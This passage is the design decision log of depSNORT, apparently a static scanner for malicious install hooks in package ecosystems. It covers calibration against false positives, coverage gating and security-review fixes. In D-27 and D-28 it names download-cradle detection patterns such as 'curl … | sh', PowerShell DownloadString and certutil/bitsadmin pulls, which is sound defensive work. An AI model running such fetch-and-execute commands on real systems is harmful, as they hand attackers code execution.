# depSNORT — Decision Log

Mirrors the project design brief. Each decision is
load-bearing; the code is annotated with the `D-0x` tags below so the rationale
travels with the implementation.

| ID | Decision |
|----|----------|
| **D-01** | **Resolution:** lockfile-first; consume deps.dev for manifest-only inputs; do **not** reimplement per-ecosystem resolvers. (Reimplementing npm/PyPI resolvers is a multi-year SAT sinkhole.) |
| **D-02** | **Dual-tree model:** an install hook is an undeclared manifest; extract and graph the hook subgraph as a **peer** of the declared tree. Node kinds and edge types for both trees exist from day one. |
| **D-03** | **Extraction vs judgment seam:** adapters emit graph **facts** (nodes/edges); checks emit **judgments** (Findings). The graph is immutable from a check's perspective; only `verdict` writes risk state. |
| **D-04** | **Static-only / zero-execution:** never install, never run a lifecycle hook. Detect hook presence + indirection, not payload semantics — detecting obfuscation is itself the finding. |
| **D-05** | **Typed verdicts:** FLAG vs WARN separated at the type level; every Finding carries `gate_class ∈ {block, gate-eligible, advisory}`. Node **color** (RiskState) and exit-code **semantics** (GateClass) are distinct axes. |
| **D-06** | **Proximity ⇒ advisory-WARN, never gates** — a structural guarantee enforced in `verdict.Evaluate`, not a config default. High recall in the report; high precision at the gate. |
| **D-07** | **Neo4j = emitter,** not a runtime dependency. The scanner stays a standalone, dependency-light static binary; the graph is an output artifact. |
| **D-08** | **Ecosystem abstraction** (`ecosystem.Adapter`) in place from day one. npm first, PyPI second to prove the seam, then RubyGems/Cargo/Composer/NuGet to cover all major install-time attack surfaces. |
| **D-09** | **CLI is the primitive;** CI-gate and pre-commit are thin wrappers. Exit contract: `0` clean/advisory-only · `1` block · `2` gate-eligible-if-opted-in · `64` usage · `70` internal. Output is deterministic. |
| **D-10** | **Language: Go** — the toolchain executes no package-authored code at build time, and it produces a single hash-pinned, zero-install-hook static binary. The tool embodies its own thesis. |

## Notes carried into code

- `internal/finding` — the `GateClass` type and `Finding.Score` (severity ×
  confidence × recency_decay) implement D-05 and the false-positive discipline.
- `internal/graph` — `NodeKind` and `EdgeType` enumerate both trees (D-02).
- `internal/ecosystem` — the `Adapter` contract's doc comment is the D-04 /
  D-03 guarantee in prose; `InstallSurfaceExtractor` is the stable step-5 seam.
- `internal/verdict` — the `switch` that derives the exit code is the D-06
  never-gate guarantee. It is covered by `TestAdvisoryNeverGates`.
- `internal/installsurface` — D-02 and D-04 in code: hooks and the files they
  reference become graph facts; capability classification stops at "what can
  this chain touch", never "what does the payload mean".

## D-11 — one heuristic is promoted to block-class

Added at step 5. `block` is otherwise reserved for deterministic set-membership
(D-05), but **VC-002d** — an install hook that references *named* credentials
**and** has network egress — is promoted to `block`. It is the ChainDrop
credential-harvesting signature, and no legitimate install hook needs registry
or cloud secrets.

The precision that earns the promotion is upstream: bare `process.env` is
classified as the weaker `env` capability, never `credentials`, so native-build
hooks (which legitimately read env and fetch prebuilt binaries) cannot reach
this rule. `TestAnalyzeBenignNativeBuildIsNotCredentialed` and the `depsnort-fixture-native`
fixture guard that boundary; if either ever fails, the promotion is unsafe and
VC-002d should drop to `gate-eligible` until precision is restored.

## D-12 — recency decay governs gating, not just ranking

Added after the first live run. Scanning ten real outdated packages surfaced a
genuine release burst in `tar@4.4.13` — four releases in two days against a
four-day cadence. Factually correct, and a benign 2019 security patch wave.

Its decay was ~0, so it *scored* zero — but its gate-class was still
`gate-eligible`, meaning `-fail-on-eligible` would break a build today over
seven-year-old news. Decay governed ranking but not gating.

`verdict.applyRecencyDemotion` closes that: a temporal finding whose
`RecencyDecay` falls below `StaleFloor` (0.15, ≈2.7 half-lives) is demoted to
`advisory`. It is **demoted, never dropped** — it stays in the report with the
demotion recorded in its evidence, because silent suppression is the same sin as
a silent cap. `block` findings are never demoted: a poisoned release does not
become safe with age.

## D-13 — determinism is enforced, not hoped for

Also from the live run. Two offline scans of identical data produced different
bytes, violating the reproducible-CI-gate requirement (D-09). Two causes, both
now fixed and both covered by tests:

1. **Map iteration order.** A lockfile's `packages` object decodes into a Go
   map, whose iteration order is deliberately randomized. Ranging it directly
   leaked that randomness into edge insertion order. The npm resolver now walks
   sorted keys, and `graph.SortedEdges()` is the emit-layer guarantee — emitters
   must use it rather than raw `Edges`.
2. **False precision in decay.** `RecencyDecay` derives from `time.Now()`, so
   consecutive scans differed in the 9th decimal. `Decay` now quantizes age to
   whole days: with a 90-day half-life, sub-day resolution is meaningless, and
   quantizing makes a scan stable for the whole day.

`TestResolveIsDeterministic` runs the resolver twelve times and byte-compares;
`TestDecayIsQuantizedToWholeDays` pins the quantization.

## D-14 — findings aggregate per package, not per advisory

The same live run produced 67 findings across ten packages — 25 on `axios` alone
— burying every supply-chain signal under CVE noise. The gate was unaffected
(vuln findings are advisory and never gate), but a report nobody can read is its
own failure mode.

VC-008 now emits one finding per package with the advisory count in the title and
the IDs in the evidence, capped at 8 listed with the remainder disclosed as
`+N more`. Same data, 67 findings down to 11.

## D-15 — the ecosystem seam, verified (and re-verified)

D-08 claimed the ecosystem abstraction was in place "from day one". Adding PyPI
tested that claim. Result: the graph model, PURL identity, check contract,
verdict engine, and all four emitters were reused **unchanged**. Only a parser
and name normalization were new. A live cross-ecosystem run resolved 90 real OSV
advisories against a Python tree, and the npm-registry source correctly sat out
(queried 0) because it filters on ecosystem.

Adding four more ecosystems (RubyGems, Cargo, Composer, NuGet) re-confirmed
this at scale. Each adapter needed only a lockfile parser — the capability
scanner, VC-002 check family, verdict engine, and emitters worked unchanged.
Composer additionally implements `InstallSurfaceExtractor` with on-disk
analysis from `vendor/`, proving the seam works for both remote-fetch (PyPI
sdist) and local-read (npm node_modules, Composer vendor) strategies.

Two leaks were found and closed rather than papered over:

- **Identity.** PyPI names must be normalized per PEP 503 before becoming a
  PURL, or `Flask_SQLAlchemy` and `flask-sqlalchemy` become two nodes and the
  transitive dedupe silently fails. NuGet names are lowercased for the same
  reason. Composer uses vendor/package as a namespace/name split.
- **Ecosystem-blind checks.** VC-006 scored every package against the npm
  typosquat corpus. Left alone it would have compared Python names to JavaScript
  names and produced confident nonsense. The corpus is now selected per
  ecosystem via `corpusFor`, and a package in an ecosystem with no corpus is
  skipped rather than mis-scored. Same principle applies to VC-007 (npm-only):
  it declines when it lacks data.

VC-004/VC-005 are now ecosystem-agnostic: a shared `registry.Client` extracts
the cache/fetch/concurrency machinery, and each ecosystem plugs in a `Spec`
(endpoint URL, URL builder, response parser). npm uses its own packument client
(the `time` map requires custom handling); the other four — RubyGems, crates.io,
Packagist, NuGet — share the generic client with per-ecosystem parse functions.

The general rule this establishes: a check that reads ecosystem-specific data
must dispatch on `Node.Ecosystem` and **decline** when it has no basis to judge.
Silence is correct; guessing is not.

## D-16 — fixture names must be verified non-existent

Found when a user's live scan of the `wormy` fixture reported **two** block
findings instead of one. The extra was `VC-001: known-malicious release
(MAL-2026-6374)` against `evil-pkg@1.0.0` — the fixture's own package name.

`evil-pkg` turned out to be a **real npm package carrying a real malware
advisory**, published 2026-06-23 with six versions. The synthetic fixture had
silently collided with live registry and OSV data, so its results depended on
external state: different online vs offline, and liable to change again if that
package is ever unpublished. A fixture whose behaviour is a function of the
internet is not a fixture.

Fixture packages are now `depsnort-fixture-*`, verified 404 on both the npm
registry and OSV at the time of writing, and the lockfile records the incident so
the constraint is not lost. Any new fixture name must be checked the same way.

Worth keeping in view, though: the collision was also the tool's **first true
positive against live malware data**. VC-001 matched a genuine `MAL-` advisory
end to end, through the real OSV path, with no seeding. The detection logic was
right; only the test data was wrong.

## D-17 — VC-006 calibrated against real-world false positives

The first scan of a real 58-repo workspace (5,370 packages) produced **43 VC-006
findings, every one a false positive**: `preact`, `color`, `through`, `tslint`,
`scapy`, `@vitest/utils` and similar. A check with a 100% FP rate is worse than
no check — it trains the operator to ignore the report.

Three failure modes, all now closed, with the observed output pinned at zero by
`TestVC006NoFalsePositivesOnRealWorkspace`:

1. **Scoped packages were scored on their bare name.** `@vitest/utils` was
   compared to `util`. A scoped package is not impersonating an unscoped one —
   the scope is explicit provenance. Scoped names are now skipped. This alone
   accounted for roughly 20 of the 43. Scope-squatting (`@babeI/core` for
   `@babel/core`) is a genuine but *different* attack requiring scope-to-scope
   comparison; it is left uncovered rather than covered badly.
2. **Legitimate near-neighbours.** Real packages that genuinely sit one edit from
   a popular name. Handled by an evidence-driven allowlist in `legitimate.go` —
   entries come from observed false positives, never from speculation.
3. **Distance-2 on short-ish names.** `commands`/`commander` and
   `password`/`passport` are unrelated words two edits apart. The minimum length
   for a distance-2 match rose from 8 to 10.

A fourth rule was added from first principles: **provenance by association**. A
typosquat is something a human mistypes into a manifest, so it arrives as a
direct dependency. A package pulled in *by* an established package is vouched
for — nobody typos their way into someone else's transitive tree.

The general lesson: a heuristic check cannot be calibrated against fixtures
alone. This one looked fine on synthetic data and was useless on real data, and
only a scan of a genuine workspace revealed it.

## D-18 — root devDependencies are part of the tree

A scan of a real 59-repo workspace reported **2,687 of 5,371 packages at depth
0** — unreachable from any root. Inspection showed ~100 orphaned nodes with no
inbound edge, 86% of them marked `direct`, and every sample was a devDependency:
`@angular/cli`, `@playwright/test`, `@biomejs/biome`.

The npm resolver built edges from `dependencies` and `optionalDependencies` only.
Root devDependencies therefore got nodes but no edges, and each stranded its
entire transitive subtree — roughly half the graph.

Correct npm semantics, now implemented: the **root project's** devDependencies
are installed and produce edges; a **dependency's** devDependencies are never
installed downstream and must not. Both directions are pinned by tests. The
lockfile's own `dev` marker is additionally recorded as `npm.dev` on the node, so
a consumer can weight dev-only exposure differently from runtime without the
resolver making that policy call.

Why it mattered beyond cosmetics: depth was wrong for half the graph, and the
provenance-by-association rule added in D-17 depends on inbound edges — a
stranded subtree cannot be vouched for by its parent, so the fix also restores
that check's accuracy.

**Follow-on, same root cause.** The devDeps fix took orphans from 100 to 14, and
the survivors named the next gap: `konva` beside `react-konva`,
`@react-three/fiber` beside `drei`, `monaco-editor`. All **peerDependencies** —
which npm 7+ installs automatically, making them real edges. That field was not
parsed either. Now it is, for every entry rather than the root alone, since a
peer is required wherever it is declared.

The pattern across D-18: edge completeness cannot be verified against small
fixtures. Every missing relation type looks fine until a real tree exposes an
unreachable subtree. The standing check is orphan count — any non-root package
with no inbound edge is a resolver gap until proven otherwise.

## D-19 — VC-005 recalibrated: a burst alone is advisory

The first full network run over a real 59-repo workspace produced **176
gate-eligible VC-005 findings**, dominated by ordinary release trains:
`@angular/*` ships ~20 packages together several times a week, and `vite`,
`undici`, `picomatch` release on similar cadences. With `-fail-on-eligible` set,
a build would have failed because Angular shipped a patch.

The original anomaly test was `median > 24h` — a bar nearly every maintained
package clears. Two corrections:

1. **A burst only matters on a slow package.** The cadence floor rose from 24h
   to 7 days, and the cluster must additionally reach 3x the release count that
   cadence predicts for the window. A package shipping weekly or faster is
   expected to cluster, so the observation carries no information.
2. **A burst ALONE is advisory, never gating.** This is the design brief's own
   composition principle applied honestly: release bursts are common and benign;
   what is not benign is a burst on a package that *also runs install-time code*.
   Gate-eligible is now earned only by that composition.

The general lesson, and the third instance of it in this project: a temporal
heuristic cannot be calibrated against synthetic history. Real registry data is
far burstier than intuition suggests.

## D-20 — the report caps advisory volume, and says so

The same run produced 1,460 findings across a **224-page PDF**. Correct, and
unreadable — which is its own failure mode (see D-14, the same lesson at smaller
scale).

The report now prints a by-check summary line before the detail, shows **every**
block and gate-eligible finding (those are actionable and are never capped), and
lists only the highest-scoring advisory findings, disclosing the remainder:
"*N further advisory finding(s) are not listed here … the complete set is in the
JSON output*". The JSON emitter is never capped.

Capping without disclosure would be exactly the silent truncation this tool
treats as a defect elsewhere; the cap is therefore stated in the artifact rather
than left for the reader to infer from a page count.

## D-21 — VC-004 is bounded by recency, not just by gap length

The second full workspace run fired VC-004 **687 times** — roughly a fifth of
every package with registry data. The thresholds were not the problem; the scope
was. The check flagged any gap over a year *anywhere* in a package's release
history, including gaps that closed half a decade ago.

That is climate history, not weather. A mature library that sat still for two
years and then shipped a maintenance release in 2019 is evidence of stability.
If you are pinned to that release, the awakening is long since settled and
nothing about it is a signal today.

VC-004 now applies a recency floor of `dormancyMinDecay = 0.15`, deliberately
equal to `verdict.StaleFloor`. D-12 says a stale temporal finding loses the right
to gate; D-21 applies the same reasoning one step earlier and says it is not a
finding at all. The axis is "recent-compromise weather" (brief §4) — an old
awakening is out of scope by definition rather than suppressed after the fact.

## D-22 — the package risk table lists risk, not inventory

The PACKAGE RISK table rendered a row per package. On a 5,371-package workspace
that is ~80 pages of the word CLEAN, and it buried the 34 rows a reader actually
needed.

The table now lists only packages carrying at least one finding, states the
count of clean packages it omitted, and caps the at-risk rows with the same
disclosure discipline as D-20. Inventory belongs in the JSON and the graph
export; the PDF is a briefing document and should read like one.

## D-23 — VC-005 inherits the D-21 recency floor

The v0.3.1 run still produced 92 VC-005 findings. Parsing the publish dates back
out of the evidence strings showed why: **82 of the 92 described bursts that had
already decayed out of relevance** — 38 aged one to three years, 37 older than
three years, and the oldest, `commondir@1.0.1`, a release cluster from **June
2015** being reported as supply-chain weather in August 2026.

This is D-21's defect in a different file. Writing a fix for VC-004 and not
carrying it to the other check on the same axis is exactly the kind of omission
a modular check design invites, so it is recorded rather than quietly patched.

`burstMinDecay` is 0.15 — the same value as `dormancyMinDecay` and
`verdict.StaleFloor`. One constant, three checks, one meaning: below it, a
temporal event is history rather than weather. The floor sits UPSTREAM of the
install-hook escalation, so a decade-old burst on a hooked package cannot reach
gate-eligible by composition. 92 findings become 10.

A false hypothesis is worth recording too: the first theory was that `@types/*`
packages were driving the count via DefinitelyTyped's batch publisher. Measured,
`@types` was 22 of 92 (24%) and 2 of 37 VC-004 hits. The theory was plausible,
specific, and wrong, and checking it cost one script.

## D-24 — resolution coverage is a first-class verdict axis

`redtiger-tools` declares 33 dependencies in an unpinned `requirements.txt`.
depSNORT resolved one node — the root — ran zero checks against zero
packages, and printed **`PASSED`, exit 0, zero findings**. The PyPI adapter had
recorded the gap honestly in a node attribute; the verdict layer never read it.

This is the inverse of the failure mode the brief warns about, and it is worse.
A tool that cries wolf gets muted. A tool that cries all-clear over something it
never read gets *trusted*. `browser-cookie3` and `keyboard`, unpinned, is exactly
the shape a supply-chain IDS exists to have an opinion about.

Coverage is therefore promoted to a second axis alongside risk, carrying the same
separation of concerns as D-05: what we saw and what we could not see are
different questions with different answers.

- Adapters record coverage as ECOSYSTEM-NEUTRAL graph facts
  (`depsnort.unresolved`, `depsnort.unresolved_count`, `depsnort.flat_resolution`),
  so the verdict layer reads them without knowing which resolver ran. Extraction
  still never judges (D-03).
- `Coverage.Degraded` — we failed to see something we should have — is distinct
  from `Coverage.Complete`. A flat lockfile format is a limitation of the format,
  not a resolver defect; treating every `Pipfile.lock` as degraded would be its
  own warning tax.
- The report banner states `INCOMPLETE` and the count before anything else, and
  the CLI warns on stderr regardless of exit code. `RESOLUTION COVERAGE` renders
  above the findings, because what the scan could not see bounds every conclusion
  under it.
- Exit code 3 exists but requires `-fail-on-incomplete`. Coverage is always
  reported and gates only on opt-in — the same discipline advisory findings get
  under D-06. Precedence is block, then gate, then coverage: act on what was
  found before acting on what was missed.

## D-22 (corrected) — the risk table orders by actionability

D-22 excluded clean packages but left the survivors in alphabetical order. On the
real workspace that meant 394 at-risk rows capped at 60, and the 60 that
survived were dominated by eighteen `@types/d3-*` entries while `esbuild`,
`sharp`, `bcrypt` and `ssh2` — every one of them named as gate-eligible in the
findings section on page one — fell past the cut, purely because `e` sorts after
`@t`.

A cap over an arbitrary ordering is not a summary; it is a coin flip with a
disclosure attached. Rows now sort by gate class, then risk state, then composed
score descending, with name as the tiebreak only.

The same run exposed a smaller asymmetry: the PDF ranked and capped by
`Finding.Score()` while the JSON omitted it, so a consumer had to reconstruct the
report's own ordering from severity, confidence and prose. `Finding` now
marshals `score` alongside its inputs. The uncapped record must carry the key it
was ordered by.

## D-25 — the hook scanner reads code, not documentation, and obfuscation must be assembly

The first real-`node_modules` run pointed VC-002 at `esbuild@0.21.5` — the
canonical sketchy-but-legitimate installer: it downloads a prebuilt binary and
execs it. Two false signals came back.

**VC-002b cited comment URLs.** The finding's conclusion was correct (esbuild
does `fetch()` the npm registry), but three of the four hosts it "reached" —
`snapcraft.io`, `nodejs.org/dist/`, a github issue link — were scraped out of a
comment block explaining the Snap Store sandbox. The npm path harvested URLs
with `urlRe` over the raw file; the Python path had already learned to strip
documentation, the npm path never did. A finding that names `snapcraft.io` as
egress when it lives in a comment is the kind of sloppiness that gets a tool
muted, and in a malicious package an attacker could bury a real C2 under a pile
of innocent comment URLs. Referenced-file source is now run through
`stripCodeComments` (block + line, with the `://` guard so URL schemes survive)
before any marker or URL scan.

**VC-002e fired on one incidental `String.fromCharCode`.** The whole obfuscation
verdict rested on a bare-substring marker, and esbuild uses `fromCharCode` once,
to format a single dash. That is not obfuscation. `fromCharCode` is removed from
the substring table and replaced with `charCodeAssemblyRe`, which requires
ASSEMBLY — `.apply`, three-or-more literal codes, or a map/reduce over
`fromCharCode` — the shape of a payload being built, not a byte being formatted.
The structural decode detectors (`decodeRe`, `blobRe`, obfuscated-scheme,
wildcard-exe) were already the real teeth; this aligns the weak marker with them.

Both are the same lesson every heuristic in this project has taught: fixtures are
clean, and the first genuinely legitimate-but-scary package finds the loose
match. The regression test pins esbuild's exact shape from both sides — no
obfuscation, no comment URLs in the remotes, but the real registry fetch and the
real exec still detected — plus a char-code-assembly-into-eval control so the
fix cannot quietly become a blind spot.

## D-26 — install-surface extraction is wired for every ecosystem, not just npm/pypi/composer

Validating v0.5.1 against a real adversarial corpus — before adding features —
exposed the worst class of defect this tool can have. Six planted fixtures were
scanned; **four produced zero findings**: `cargo-buildrs-exfil`,
`gem-extconf-payload`, and (latent, untested) any NuGet install script. The
dependency trees resolved fine. The install-time code was simply never read.

The cause was not a weak heuristic — it was no heuristic at all. `AnalyzeRust`,
`AnalyzeRuby`, and `AnalyzeDotNet` existed in `installsurface`, with the cargo
and gem adapters even *documenting* the `build.rs` / `extconf.rb` attack vector
in their package comments — but no adapter ever called them. Three of six
ecosystems implemented `ExtractInstallSurface`; the other three did not, so the
engine's interface assertion skipped them and their install surface went
unexamined. Dead code that reads as coverage is a false all-clear, which is
exactly the failure the brief forbids (§6): a scanner that stays silent on a
crate's `build.rs` is worse than no scan, because silence reads as "clean."

The fix wires the three orphaned analyzers into their adapters:

- cargo reads the root crate's `build.rs`; gem reads `extconf.rb` (root and
  `ext/*/`) plus the gemspec; nuget reads `install.ps1` / `init.ps1`.
- Scope is the root package, matching npm/pypi: transitive crates and gems are
  not on disk in a source checkout, so their scripts are left unrepresented
  rather than guessed at.
- A new shared `instsurf.AddToGraph` materializes the surface, ending the
  copy-paste of npm's ~60-line wiring block. npm/pypi/composer predate it and
  keep their inline copies; everything after D-26 goes through the helper.

The false-positive discipline is preserved structurally: a `build.rs` or
`extconf.rb` with no network / credential / obfuscation capability produces no
finding, because native builds are ordinary and flagging every one is the tax
that gets a tool muted. Only the composed capabilities gate.

The regression corpus (`instsurf/wiring_test.go`) now scans a
credential-plus-network hook in each of the three ecosystems and asserts it
BLOCKS, plus an ordinary build script that must stay silent — so no future
refactor can let one of these ecosystems go quiet again without failing CI.

Two narrower gaps the same run surfaced remain open and tracked separately:
`composer-plugin-cradle` resolves through `AnalyzePHP` (which reads only the
composer.json scripts map and package type, not plugin PHP source), and
`pypi-pth-persistence` has no `.pth` on disk in a source checkout (only in
installed site-packages). Both are documented limitations, not silent misses.

## D-27 — composer reads the root manifest and the plugin entrypoint

`composer-plugin-cradle` was the last real attack shape the adversarial corpus
left silent. On inspection it was silent for a blunter reason than "we can't
read PHP": the composer adapter returned early from all install-surface
extraction whenever `vendor/` was absent — so on any un-installed checkout it
never opened the root project's own `composer.json`, and the fixture's payload
(a `certutil -urlcache` download cradle in `post-install-cmd`) was never seen.
The vendor guard, meant to skip *transitive* source that only exists after
`composer install`, was skipping the *root* too.

The fix has two parts:

  1. The root project's `composer.json` is now always read from the project
     directory, independent of `vendor/` — mirroring how npm and pypi handle
     their root. Transitive packages still require `vendor/` to be present,
     because their source genuinely is not on disk until installed. This alone
     moves the fixture from silent to VC-002b (the cradle's network egress).

  2. A composer-plugin's declared entrypoint (`extra.class`) is now resolved
     through the package's PSR-4 autoload map and its PHP source is scanned like
     any other hook body. A plugin's `activate()` runs on every Composer
     operation, so it is install-time code even when no lifecycle script is
     declared — and a cradle that hides its fetch-and-run in the plugin class,
     rather than in a script, is now caught. `AnalyzePHP` gained a
     `pluginSource` parameter; when the source cannot be resolved the bare
     CapExec fallback stands, so a plugin is recorded as "present, source
     unread" rather than downgraded to clean. PHP source is comment-stripped
     before scanning, per D-25.

False-positive discipline holds structurally: an ordinary composer-plugin with
a benign entrypoint and no scripts exhibits only CapExec, which no VC-002 check
gates on. Only composed capabilities — network, credentials, obfuscation —
produce a finding.

Corpus result: the adversarial set is down to a single silence,
`pypi-pth-persistence`, which is the documented boundary from D-26 (a `.pth`
file exists only in installed site-packages, never in a source checkout) rather
than a defect. The certutil cradle lands as VC-002b (network) rather than a
block because it is ingress-and-execute, not credential exfil; promoting
fetch-then-execute download cradles to a higher gate is a separate calibration,
noted but not made here.

## D-28 — a download cradle blocks; an ordinary binary download does not

The composer cradle exposed a gap in the gate model: `certutil -urlcache … &&
payload.exe` was landing at gate-eligible VC-002b, the same tier as esbuild
fetching a prebuilt binary. Those are not the same act. esbuild pulls a *shipped*
binary from a known host; a cradle fetches code off the network and runs it in
the same breath — the initial-access primitive.

VC-002f promotes the cradle to block-class, but only on a signal narrow enough
that esbuild never trips it: a fetch piped straight into an interpreter
(`curl … | sh`, `iex (New-Object Net.WebClient).DownloadString(…)`), or a LOLBin
pull (`certutil -urlcache`, `bitsadmin /transfer`). Plain `network + exec` is
deliberately NOT the trigger — that is esbuild's shape and stays advisory. The
new `CapCradle` capability carries the signal; VC-002b defers to VC-002f when it
is present, so a cradle produces one authoritative block, not a block plus a
redundant network warning.

## D-29 — VC-003: the operator's IOC ledger is a first-class, block-class source

VC-003 was reserved from the brief for the operator's own indicator ledger and
was the last unbuilt check. It is not a heuristic: an entry is the operator
saying "I have confirmed this is bad," so a match blocks with confidence 1.0.
The value the tool adds is fan-out — one confirmed indicator, matched across an
entire transitive tree where a human would never catch it by eye.

Rather than couple depsnort to a proprietary ledger format, the seam is an
exported feed: a stable, documented JSON schema (`docs/ioc-ledger.example.json`)
that the operator points `-ioc` at. Matching is by most-specific identity — exact
PURL, then ecosystem+name+version, then ecosystem+name (any version) — so the
ledger can pin a single poisoned release or condemn a package outright. The feed
is loaded and matched onto the graph by the orchestrator; the check reads the
result. No ledger supplied → VC-003 is silent.

## D-30 — the CI gate and pre-commit hook are thin wrappers, as promised

D-09 declared the CI gate and pre-commit hook thin wrappers over the CLI's
exit-code contract; D-30 delivers them and keeps that promise — no logic lives in
them that the CLI does not already own. `scripts/depsnort-ci-gate.sh` emits SARIF
for a CI security tab and an optional dated PDF, and exits on the depsnort
contract (1 block, 2 gate-eligible with opt-in, 3 incomplete with opt-in).
`scripts/depsnort-pre-commit.sh` hard-fails a commit only on block by default, so
day-to-day work is not held hostage by advisory CVE noise, with
`FAIL_ON_ELIGIBLE=1` to tighten and `--no-verify` as the documented escape.
`scripts/github-actions.example.yml` wires it into Actions with SARIF upload.
Both honor `-ioc`, so the operator's ledger gates every pipeline run.

## D-31 — a front door: banner + pip install

Cosmetic, and deliberately so — a tool people are meant to run should announce
itself. `depsnort`, `depsnort version`, and `depsnort banner` now print a
bright-red block-letter "depSNORT" (figlet "block" font — dashes, per the house
style) over the purple-team intent line `$global:Intent = 'Purple'`. Color is
emitted only to a terminal and suppressed under NO_COLOR, so `scan` output —
JSON, SARIF, the report tree — never gets escape codes. The banner is a Go
concern (single source of truth); no other code path prints it.

`pip install depSNORT` now works via a thin packaging shim (`pyproject.toml` +
`setup.py`): a setuptools build hook compiles the static Go binary (D-10) into
the wheel, and a `depsnort` console script execs it unchanged. The engine stays
Go; Python is only a launcher, so there is one implementation, not two. The Go
toolchain is a build-time requirement — consistent with a project whose whole
identity is a single dependency-free static binary.

## D-32 — external technical review (v0.6.1): six findings remediated

An independent architecture / security-boundary review of the public v0.6.1
repository raised six findings (two Critical, three High, one Moderate). All six
were confirmed against the code and fixed; each fix ships with regression tests
that fail on the old behavior.

**F-01 (Critical) — the pre-commit gate did not gate.** `depsnort-pre-commit.sh`
ran the scanner as an `if` condition and read `$?` *after* `fi`. A completed
if-statement with a false condition and no else returns 0, so a block-class
finding (scanner exit 1) was captured as 0 and the commit sailed through. Fixed
with the direct `rc=0; scanner || rc=$?` form the CI gate already used, plus a
`FAIL_ON_INCOMPLETE` pass-through. `scripts/wrapper_test.sh` stubs the scanner at
each exit code (0/1/2/3/64/70) and asserts the block-vs-pass mapping on sh, bash,
and dash.

**F-02 (Critical) — incomplete-coverage gated on graph facts only.** The verdict
received `graph.Coverage()`, whose `Degraded` flag is derived solely from
unresolved dependencies and orphaned nodes. An empty OSV cache, a failed
registry source, an unreadable install surface, or a workspace project that never
resolved were all warned to stderr and dropped — none could reach exit 3, so
`-fail-on-incomplete` could still return a clean 0 over a scan that barely
looked. That directly contradicted the README's own guarantee. Fixed by
extending `graph.Coverage` with scan-level gap fields
(`DataSourceGaps`/`ExtractorGaps`/`FailedProjects`) and an `Incomplete()` method
that folds them in with graph resolution; the CLI populates them and calls the
new `verdict.EvaluateWithCoverage`, which gates on `Incomplete()`. Precedence is
unchanged and central: block > gate-eligible > incomplete. The PDF verdict banner
and the stderr warning now report every gap class, so reports and exit codes
agree. Proven end-to-end: an offline empty OSV cache returns exit 0 with a
warning by default and exit 3 under `-fail-on-incomplete`.

**F-03 (High) — local reads could cross the repository boundary.** The npm
adapter did lexical `..`/absolute containment but never resolved symlinks;
Composer built `vendor/` and PSR-4 paths from untrusted lockfile / composer.json
content with no canonical check; the other adapters read via bare path joins. A
hostile checkout could steer a read out of the scan root through a symlink or a
crafted name. Fixed with one primitive, `internal/securefs`: it rejects absolute
and traversal inputs, resolves symlinks and re-checks containment on the
canonical path, refuses non-regular files, and caps per-file size. Every
ecosystem's install-surface read (npm, PyPI, RubyGems, Cargo, Composer, NuGet)
now routes through it. Regression fixtures cover `..` escapes, absolute paths,
and file/directory symlink escapes — rejected — while contained symlinks and
legitimate in-tree reads still succeed.

**F-04 (High) — the wheel was mislabeled platform-independent.** `setup.py`
compiles an OS/arch-specific Go binary into the wheel but declared no native
code, so setuptools produced a `py3-none-any` wheel that an index would offer to
incompatible platforms. Fixed with a `bdist_wheel` override that marks the
distribution impure and pins the platform tag while keeping the Python tag broad
(`py3-none-<platform>`) — the launcher is interpreter-agnostic, the binary is
not. Verified: the built wheel is `...-py3-none-linux_x86_64.whl`,
`Root-Is-Purelib: false`, and the embedded binary runs.

**F-05 (High) — sdist processing lacked cumulative hostile-input controls.** The
PyPI sdist path capped compressed size and per-file size but did not verify the
PyPI-declared SHA-256, cap total decompressed bytes, cap tar entry count, or cap
retained `.pth` count/size, and it returned partial extraction as success on a
malformed tar. Fixed: the artifact is read once and its SHA-256 verified before
any byte is trusted; decompressed-total, entry-count, and `.pth` count/size caps
are enforced; a truncated or corrupt tar is now a returned error (a coverage gap
via F-02), never a clean partial. Redirect destinations are constrained to PyPI
content hosts. Fixtures cover bomb, entry-flood, truncation, digest mismatch, and
the `.pth` caps.

**F-06 (Moderate) — CI, versioning, and disclosure maturity.** Added
`.github/workflows/ci.yml` (gofmt, vet, `go test -race`, static build, the
zero-dependency dogfood check, the pre-commit wrapper contract on sh+bash,
cross-platform build matrix, and a wheel-tag assertion) and `release.yml`
(checksummed cross-platform binaries on a tag). Actions are patch-pinned and
tracked by `.github/dependabot.yml`. The version is single-sourced from
`pyproject.toml` — the Makefile and `setup.py` read it and inject it via
`-ldflags`, and `main.version` defaults to `dev` so an un-injected build never
claims a release number. `SECURITY.md` now documents a private disclosure
channel (GitHub private vulnerability reporting) and response expectations.

Remaining, by the reviewer's own sequencing (production-adoption tail, needs
operator decisions): signed provenance / Sigstore attestation, a published SBOM,
parser fuzzing, and performance baselines.

## D-33 — closing the production-adoption tail: fuzzing, baselines, SBOM, provenance

The v0.6.1 review (D-32) left a 60–90 day tail — parser fuzzing, performance
baselines, a published SBOM, and signed provenance. Taken together they are the
difference between "the tests we thought to write pass" and "we went looking for
what we did not think of." Two of the four found real defects, which is the
argument for doing them rather than deferring them again.

**Fuzzing found two identity bugs.** Sixteen native Go fuzz targets now cover all
six lockfile parsers, the PURL identity layer, semver, the five install-surface
analyzers, the sdist tar reader, and path containment. Two genuine defects
surfaced in `internal/purl`, which matters more than it first sounds: node
identity across the entire tool IS the PURL string — the graph dedupes on it,
IOC ledger entries key on it, and cross-repo blast radius is computed by merging
equal ones.

  1. *Normalization drifted.* `Parse` consumed a trailing `@` as a version
     separator even with no version after it, and `String` never re-emitted it,
     so `pkg:npm/@@@@@@@` lost one character per round trip. A value that is
     supposed to be a stable identity was not a fixed point.
  2. *A crafted name could forge structure.* Because `@` was written raw, a
     package literally named `lodash@4.17.21` with no version rendered the exact
     PURL of the real `lodash@4.17.21` — an identity collision a hostile lockfile
     could mint deliberately, and equally a way to slip past an IOC ledger entry
     keyed on a PURL. `/` could likewise forge a namespace segment, and an
     invalid type (`pkg:0@/@`) produced a PURL that would not re-parse at all.

  Fixed by percent-encoding the structural characters (`@`, `/`, `%`) within each
  component, decoding on parse in a single left-to-right pass so `%2540` decodes
  to `%40` and never to `@`, refusing to treat a trailing `@` as a separator, and
  validating the type against the spec's charset. Canonical output for real
  packages is unchanged — npm scopes live in the namespace and Composer vendors
  are split off, so no legitimate name contains these characters — and the
  existing round-trip and scope tests still pass untouched. `TestCraftedName*`
  pins the injection cases.

  The containment fuzzer is the one worth keeping honest about: it asserts a
  security property, not the absence of a panic. A sentinel file and a symlink to
